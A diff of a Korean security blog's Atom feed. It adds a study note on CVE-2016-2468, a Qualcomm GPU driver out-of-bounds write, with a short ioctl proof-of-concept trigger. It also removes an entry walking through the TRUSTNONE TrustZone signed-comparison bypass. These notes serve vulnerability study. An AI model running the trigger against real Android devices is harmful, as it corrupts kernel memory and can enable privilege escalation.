@@ -4,7 +4,7 @@
   <title><![CDATA[KC's blog]]></title>
   <link href="http://zomo.heroku.com/atom.xml" rel="self"/>
   <link href="http://zomo.heroku.com/"/>
-  <updated>2016-05-03T18:10:33+09:00</updated>
+  <updated>2016-06-13T13:41:29+09:00</updated>
   <id>http://zomo.heroku.com/</id>
   <author>
     <name><![CDATA[KC]]></name>
@@ -12,6 +12,84 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CVE-2016-2468]]></title>
+    <link href="http://zomo.heroku.com/blog/2016/06/13/cve-2016-2468/"/>
+    <updated>2016-06-13T13:31:59+09:00</updated>
+    <id>http://zomo.heroku.com/blog/2016/06/13/cve-2016-2468</id>
+    <content type="html"><![CDATA[<p><a href="http://retme.net/index.php/2016/06/12/CVE-2016-2468.html">Disclosure of CVE-2016-2468, OOB write in Qualcomm MSM GPU driver</a></p>
+
+<ul>
+<li><code>size</code> 의 하위 32 bit 가 0x80000000 보다 크면, <code>len</code> 이 음수가 된다.</li>
+<li>그러면 루프에 들어가지 않고, 바로 <code>sg_mark_end()</code> 가 불린다.</li>
+<li>그러면 <code>sglen</code> 이 0 인 상황에 변함이 없으므로, <code>sg_mark_end(&amp;memdesc-&gt;sg[-1]);</code> 이 된다.</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>static int
+</span><span class='line'>_kgsl_sharedmem_page_alloc(struct kgsl_memdesc *memdesc,
+</span><span class='line'>  struct kgsl_pagetable *pagetable,
+</span><span class='line'>  size_t size)
+</span><span class='line'>{
+</span><span class='line'>  int ret = 0;
+</span><span class='line'>  int len, page_size, sglen_alloc, sglen = 0;
+</span><span class='line'>  unsigned int align;
+</span><span class='line'>
+</span><span class='line'>  //...snip...
+</span><span class='line'>
+</span><span class='line'>  len = size;
+</span><span class='line'>  while (len &gt; 0) {
+</span><span class='line'>      //...snip...
+</span><span class='line'>  }
+</span><span class='line'>  memdesc-&gt;sglen = sglen;
+</span><span class='line'>  memdesc-&gt;size = size;
+</span><span class='line'>  sg_mark_end(&memdesc-&gt;sg[sglen-1]);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>PoC 는,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>void kgsl_poc() {
+</span><span class='line'>  int fd = open("/dev/kgsl-3d0",0);
+</span><span class='line'>  struct kgsl_gpumem_alloc_id arg;
+</span><span class='line'>  
+</span><span class='line'>  arg.flags = 0;
+</span><span class='line'>  arg.size = 0xa18fb010b0c08000;
+</span><span class='line'>  ioctl(fd,IOCTL_KGSL_GPUMEM_ALLOC_ID,&arg);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>사이즈가 다른 변수간에 형변환하다가, neg 가 되버리는 이슈.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Security Analysis of Emerging Smart Home Applications]]></title>
@@ -990,79 +1068,6 @@ OpenSSL 버그때문에, 서버 설정에 상관없이, 강제로 SSLv2 로 네�
     <updated>2015-12-23T16:09:25+09:00</updated>
     <id>http://zomo.heroku.com/blog/2015/12/23/on-the-juniper-backdoor</id>
     <content type="html"><![CDATA[<p>Matthew Green 블로그에 올라온 Juniper 장비 백도어에 대해 정리해본다.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[TRUSTNONE]]></title>
-    <link href="http://zomo.heroku.com/blog/2015/12/07/trustnone/"/>
-    <updated>2015-12-07T17:14:52+09:00</updated>
-    <id>http://zomo.heroku.com/blog/2015/12/07/trustnone</id>
-    <content type="html"><![CDATA[<p>Sean Beaupre 씨가 쓴 글, <a href="http://theroot.ninja/disclosures/TRUSTNONE_1.0-11282015.pdf">TRUSTNONE</a> 을 읽고 정리해본다.</p>
-
-<p>스냅드래곤 805 트러스트존 커널의 메모리/레지스터를 읽고 쓸 수 있다.</p>
-
-<h4>백그라운드</h4>
-
-<p><code>tzbsp_smmu_fault_regs_dump</code> 라는 시스템콜에 버그가 있어서.</p>
-
-<ol>
-<li>4 개의 인자를 기대하는데.</li>
-<li><code>R4-R8</code> 과 링크 레지스터를 스택에 저장하고</li>
-<li><code>R0</code>,<code>R1</code>,<code>R2</code>,<code>R3</code> 에 담긴 arg0, arg1, arg2, arg3 를 <code>R5-R8</code> 에 옮기고. 이때 <code>adds</code> 로 <code>R2</code> 가 0 인지 아닌지를 체크하고</li>
-<li><code>BEQ</code> 로 <code>R2 != 0</code> 이면 <code>is_debugging_disabled</code> 체크하는 루틴으로 뛰고</li>
-<li><code>CBZ</code> 로, <code>is_debugging_disabled</code> 가 1 이면 <code>loc_FE85881E</code> 로 뛰고</li>
-<li><code>do_regs_dump</code> 를 호출하는데.</li>
-<li><code>do_regs_dump</code> 에서 <code>validate_input</code> 을 부른다</li>
-<li><code>validate_input</code> 에서 <code>do_sloppy_signed_comparison</code> 을 부르는데</li>
-<li><code>do_sloppy_signed_comparison</code> 은 <code>CMP R0, #7</code> <code>BGE loc_FE863164</code> 로 흘러간다</li>
-<li>BGE 일 경우, #0 을 돌려주고, 아니면 1 을 돌려준다</li>
-<li>그런데 THUMB BGE 명령어는 signed comparison 이다</li>
-<li>R0 가 0~6 이면 당연히 #1 을 돌려주지만, minus 일경우에도 #1 을 돌려준다</li>
-<li>minus 값으로 체크를 통과하는 듯</li>
-<li>validate_something_else 가 불리는데</li>
-</ol>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>R0 = arg0;
-</span><span class='line'>R1 = arg1;
-</span><span class='line'>R0 = R0 * 0x11;
-</span><span class='line'>uint *R2 = (uint *)0xFE8282CC; /* this is in a data segment in TrustZone kernel */
-</span><span class='line'>R2 = *R2; /* in the TrustZone image I'm testing with, this value = 0xFE827B58 */
-</span><span class='line'>R0 = 4 + (R0 * 0x10);
-</span><span class='line'>R0 = *(R0 + R2);
-</span><span class='line'>if (R0 &lt; R1) return 0; /* fail - we need to return 1, thus R0 needs to be &gt; R1 */</span></code></pre></td></tr></table></div></figure>
-
-
-<p><code>do_sloppy_signed_comparison</code> 에서 <code>R0</code> 가 0~6 사이의 값일 것을 검사했지만, 사실 0x80000000 ~ 0xFFFFFFFF 사이의 음수라도 검사를 통과할 수 있었다. R0 가 음수일 경우를 가정해보자. 예를 들어, 0x88888888 이라면?</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>R0 = arg0 = 0x88888888;
-</span><span class='line'>R1 = arg1;
-</span><span class='line'>R0 = R0 * 0x11; /* 0x11111108 */
-</span><span class='line'>R2 = 0xFE8282CC;
-</span><span class='line'>R2 = *(uint *)R2; /* 0xFE827B58 */
-</span><span class='line'>R0 = 4 + (R0 * 0x10); /* 0x11111084 */
-</span><span class='line'>R0 = *(R0 + R2); /* R0 now is loaded with the data contained at physical address 0x11111084 + 0xFE827B58 = 0x0F938BDC /* &lt;&lt; This memory location is NOT secure, we can control it! */ 
-</span><span class='line'>if (R0 &lt; R1) return 0;</span></code></pre></td></tr></table></div></figure>
-
-
-<p>validate_input 에서 돌아오면, 비슷한 계산을 또 하는데.</p>
 ]]></content>
   </entry>
   
